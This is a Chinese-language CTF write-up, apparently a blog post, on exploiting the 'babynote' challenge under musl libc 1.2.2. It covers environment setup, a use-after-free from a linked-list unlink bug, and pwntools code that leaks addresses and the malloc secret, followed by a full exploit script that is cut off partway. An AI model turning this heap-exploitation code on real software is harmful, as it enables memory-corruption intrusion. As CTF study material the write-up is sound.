<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">musl <span class="title">libc</span> <span class="params">(x86_64)</span></span></span><br><span class="line"><span class="function">Version 1.2.2</span></span><br><span class="line"><span class="function">Dynamic Program Loader</span></span><br><span class="line"><span class="function">Usage: ./libc.so [options] [--] pathname [args]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>version 1.2.2</li>
</ul>
<p><strong>环境搭建</strong></p>
<p>第一次运行 musl 程序会出现以下报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babynote ldd babynote </span><br><span class="line">./babynote: error <span class="keyword">while</span> loading shared libraries: /lib/x86_64-linux-gnu/libc.so: invalid ELF header</span><br></pre></td></tr></table></figure>
<p>接下来需要搭建 musl 环境：</p>
<ul>
<li>下载源码：<a target="_blank" rel="noopener" href="https://git.musl-libc.org/cgit/musl">musl - musl - an implementation of the standard library for Linux-based systems (musl-libc.org)</a> </li>
<li>下载 Unix 安装包：<ul>
<li><a target="_blank" rel="noopener" href="https://debian.pkgs.org/10/debian-main-amd64/musl_1.1.21-2_amd64.deb.html">musl_1.1.21-2_amd64.deb Debian 10 Download (pkgs.org)</a> </li>
<li><a target="_blank" rel="noopener" href="https://ubuntu.pkgs.org/22.04/ubuntu-universe-amd64/musl_1.2.2-4_amd64.deb.html">musl_1.2.2-4_amd64.deb Ubuntu 22.04 LTS Download (pkgs.org)</a> </li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i musl_1.1.21-2_amd64.deb </span><br><span class="line">sudo apt-get install -y musl musl-dev</span><br><span class="line"></span><br><span class="line">sudo dpkg -i musl_1.2.2-4_amd64.deb</span><br><span class="line">sudo apt-get install -y musl musl-dev</span><br></pre></td></tr></table></figure>
<ul>
<li>如果是 ubuntu 的环境则推荐在 <a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/">launchpad.net</a> 上下载符号</li>
</ul>
<p><img src="/2023/03/09/musl%20pwn%20%E5%88%9D%E6%8E%A2+%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1678348781333.png" alt="1678348781333"> </p>
<ul>
<li>Libc 的调试符号也可以在这个网站上找</li>
</ul>
<p><img src="/2023/03/09/musl%20pwn%20%E5%88%9D%E6%8E%A2+%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1678348917905.png" alt="1678348917905"> </p>
<ul>
<li>下载 <code>musl-dbgsym_1.2.2-4_amd64.ddeb</code> 并安装：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i musl-dbgsym_1.2.2-4_amd64.ddeb</span><br></pre></td></tr></table></figure>
<p>启动程序，发现可以运行并且还有调试信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __malloc_context</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  secret = <span class="number">15159866117235981951</span>,</span><br><span class="line">  init_done = <span class="number">1</span>,</span><br><span class="line">  mmap_counter = <span class="number">0</span>,</span><br><span class="line">  free_meta_head = <span class="number">0x0</span>,</span><br><span class="line">  avail_meta = <span class="number">0x55555555a130</span>,</span><br><span class="line">  avail_meta_count = <span class="number">94</span>,</span><br><span class="line">  avail_meta_area_count = <span class="number">0</span>,</span><br><span class="line">  meta_alloc_shift = <span class="number">0</span>,</span><br><span class="line">  meta_area_head = <span class="number">0x55555555a000</span>,</span><br><span class="line">  meta_area_tail = <span class="number">0x55555555a000</span>,</span><br><span class="line">  avail_meta_areas = <span class="number">0x55555555b000</span> &lt;error: Cannot access memory at address <span class="number">0x55555555b000</span>&gt;,</span><br><span class="line">  active = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a0e0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a0b8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a090</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a068</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a040</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55555555a018</span>, <span class="number">0x0</span> &lt;repeats <span class="number">24</span> times&gt;&#125;,</span><br><span class="line">  usage_by_class = &#123;<span class="number">0</span> &lt;repeats <span class="number">48</span> times&gt;&#125;,</span><br><span class="line">  unmap_seq = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;,</span><br><span class="line">  bounces = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;,</span><br><span class="line">  seq = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  brk = <span class="number">93824992260096</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后补充一点：</p>
<ul>
<li>使用 patch 时要把 <code>libc.so</code> 给当成 <code>ld</code>（而不是 <code>libc.so.6</code>）</li>
<li>也就是使用如下代码进行 patch：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf ./babynote --set-interpreter ./libc.so babynote1</span><br></pre></td></tr></table></figure>
<ul>
<li>patch 后就相当于使用题目提供的 <code>libc.so</code> 来进行调试，可能没有符号信息</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)chunk-&gt;name);                  <span class="comment">// UAF</span></span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)chunk-&gt;note);</span><br><span class="line"><span class="built_in">free</span>(chunk);</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF，但我们不能直接控制 free chunk</li>
<li>在 “申请模块” 中，程序的核心结构体被单向链表组织起来</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;pre_chunk = head_chunk;</span><br><span class="line">head_chunk = chunk;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 “释放模块” 中，被释放的结构体会被脱链，也就利用不了 UAF 堆块了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( chunk != head_chunk || head_chunk-&gt;pre_chunk )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk-&gt;pre_chunk )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;head_chunk; chunk != *i; i = &amp;(*i)-&gt;pre_chunk )</span><br><span class="line">            ;</span><br><span class="line">        *i = chunk-&gt;pre_chunk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    head_chunk = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>但脱链的过程有一个漏洞：没有对尾节点进行特殊处理（尾节点释放时不会脱链）</li>
<li>PS：这段代码比较绕，建议画图理解</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>musl 1.2.2 采用了：<code>malloc_context-&gt;meta_arena-&gt;meta-&gt;gropu(chunks)</code> 这样的多级结构，并且 free 掉的 chunk 由 bitmap 直接管理（而不是放入某些链表中） </p>
<p>musl 与 libc 的堆结构完全不同：</p>
<ul>
<li>测试代码如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x58</span>,<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0xe0</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0xd8</span>,<span class="number">0xe0</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0xd8</span>)</span><br><span class="line">add(<span class="number">0xe0</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0xd8</span>,<span class="number">0xe0</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0xd8</span>)</span><br><span class="line">dele(<span class="number">0xe0</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0xd8</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>GDB 输出结果如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; mheap</span><br><span class="line">          secret : <span class="number">0xff7c19f1b291b8fd</span></span><br><span class="line">    mmap_counter : <span class="number">0x0</span></span><br><span class="line">      avail_meta : <span class="number">0x55942a780248</span> (count: <span class="number">87</span>)</span><br><span class="line">       free_meta : <span class="number">0</span></span><br><span class="line"> avail_meta_area : <span class="number">0x55942a781000</span> (count: <span class="number">0</span>)</span><br><span class="line">  meta_area_head : <span class="number">0x55942a780000</span></span><br><span class="line">  meta_area_tail : <span class="number">0x55942a780000</span></span><br><span class="line">       active[<span class="number">2</span>] : <span class="number">0x55942a780130</span> (mem: <span class="number">0x5594294dbc30</span>) [<span class="number">0x30</span>]</span><br><span class="line">       active[<span class="number">3</span>] : <span class="number">0x55942a7800e0</span> (mem: <span class="number">0x5594294dbfb0</span>) [<span class="number">0x40</span>]</span><br><span class="line">       active[<span class="number">6</span>] : <span class="number">0x55942a780158</span> (mem: <span class="number">0x5594294db840</span>) [<span class="number">0x70</span>]</span><br><span class="line">       active[<span class="number">7</span>] : <span class="number">0x55942a7800b8</span> (mem: <span class="number">0x5594294dbf20</span>) -&gt; <span class="number">0x55942a780108</span> (mem: <span class="number">0x7f58909b9f40</span>) [<span class="number">0x80</span>]</span><br><span class="line">      active[<span class="number">11</span>] : <span class="number">0x55942a7801d0</span> (mem: <span class="number">0x5594294db050</span>) -&gt; <span class="number">0x55942a780090</span> (mem: <span class="number">0x5594294dbe20</span>) [<span class="number">0xf0</span>]</span><br><span class="line">      active[<span class="number">15</span>] : <span class="number">0x55942a7801f8</span> (mem: <span class="number">0x5594294db040</span>) [<span class="number">0x1f0</span>]</span><br><span class="line">      active[<span class="number">19</span>] : <span class="number">0x55942a780220</span> (mem: <span class="number">0x5594294db030</span>) [<span class="number">0x3f0</span>]</span><br><span class="line">      active[<span class="number">23</span>] : <span class="number">0x55942a780018</span> (mem: <span class="number">0x5594294db020</span>) [<span class="number">0x7f0</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>active[7]</code> 似乎有点特殊，从一开始就有两个 meta</li>
<li><code>active[15]</code> 中的 meta 都只能存放一个 chunk，当第二个 chunk 申请时，musl 就会重新分配一个 meta 使其插入 <code>active[15]</code>，<code>active[15]</code> 中原来的 meta 就会因为没有可用的 chunk 而脱链</li>
<li>当 <code>&quot;c&quot;*0xd8</code> 释放时，该 chunk 所属的 meta 会重新插回 <code>active[15]</code>，最后结果如上图</li>
<li>PS：刚刚释放的 chunk 不会马上被申请，要等到对应 meta 申请完毕以后才会把 free chunk 放回 avail chunk（chunk 的状态用 <code>avail_mask/freed_mask</code> 来表示）</li>
</ul>
<p>泄露堆地址（程序基地址）的思路如下：</p>
<ul>
<li>申请 0x28 大小的 <code>note1</code>，此时 <code>info1 note1</code> 物理相邻</li>
<li>利用堆风水使目标结构体为尾节点，释放尾节点（尾节点不会脱链，因此产生 UAF <code>info1</code> 和 UAF <code>note1</code>）</li>
<li>申请 0x38 大小的 <code>note2</code>，此时该 <code>note2</code> 的 <code>info2</code> 会占用 UAF <code>node1</code> 的空间</li>
<li>读取 UAF <code>info1</code> 就会把 <code>info2</code> 给当成 <code>note1</code> 并输出，泄露基地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">forget()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;E&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">&quot;F&quot;</span>*<span class="number">0xc</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&quot;E&quot;</span>*<span class="number">0xc</span>)</span><br><span class="line">add(<span class="string">&quot;eqqie&quot;</span>,<span class="string">&quot;x&quot;</span>*<span class="number">0x38</span>)</span><br><span class="line">show(<span class="string">&quot;E&quot;</span>*<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x28:&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    leak_addr += <span class="built_in">int</span>(p.recv(<span class="number">2</span>).decode(), <span class="number">16</span>) &lt;&lt; (i*<span class="number">8</span>)</span><br><span class="line">pro_base = leak_addr - <span class="number">0x48b0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>用同样的方法可以泄露 GOT 表上的函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">read_got = pro_base + <span class="number">0x3fa8</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">forget()</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;c&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fake_note = p64(pro_base+<span class="number">0x4900</span>) + p64(read_got)</span><br><span class="line">fake_note += p64(<span class="number">4</span>) + p64(<span class="number">8</span>) </span><br><span class="line">fake_note += p64(<span class="number">0</span>) </span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, fake_note) </span><br><span class="line">show(<span class="string">&quot;b&quot;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x8:&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    leak_addr += <span class="built_in">int</span>(p.recv(<span class="number">2</span>).decode(), <span class="number">16</span>) &lt;&lt; (i*<span class="number">8</span>)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x72740</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>并且用同样的方法来泄露 <code>malloc_context-&gt;secret</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;y&quot;</span>*<span class="number">0x4</span>) </span><br><span class="line">forget() </span><br><span class="line"></span><br><span class="line">heap_secret_ptr = libc_base + <span class="number">0xad9c0</span></span><br><span class="line">success(<span class="string">&quot;heap_secret_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_secret_ptr))</span><br><span class="line"></span><br><span class="line">forget() </span><br><span class="line">add(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">add(<span class="string">&quot;B&quot;</span>*<span class="number">0x4</span>, <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line">dele(<span class="string">&quot;A&quot;</span>*<span class="number">0x4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    show(<span class="string">&quot;x&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fake_note = p64(heap_base+<span class="number">0x48c0</span>) + p64(heap_secret_ptr) </span><br><span class="line">fake_note += p64(<span class="number">4</span>) + p64(<span class="number">8</span>) </span><br><span class="line">fake_note += p64(<span class="number">0</span>) </span><br><span class="line">add(<span class="string">&quot;C&quot;</span>*<span class="number">0x4</span>, fake_note) </span><br><span class="line">show(<span class="string">&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x8:&quot;</span>)</span><br><span class="line">heap_secret = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    heap_secret += <span class="built_in">int</span>(p.recv(<span class="number">2</span>).decode(), <span class="number">16</span>) &lt;&lt; (i*<span class="number">8</span>)</span><br><span class="line">success(<span class="string">&quot;heap_secret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_secret))</span><br></pre></td></tr></table></figure>
<p>最后需要伪造 <code>meta_area meta group chunk</code> 并在 <code>chunk</code> 中写入 <code>fake stdout</code></p>
<p>然后使得假的 meta dequeue 以实现 unlink，与此同时会劫持 <code>stdout_used</code> 写入我们伪造的 <code>fake stdout</code> 地址</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babynote&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span 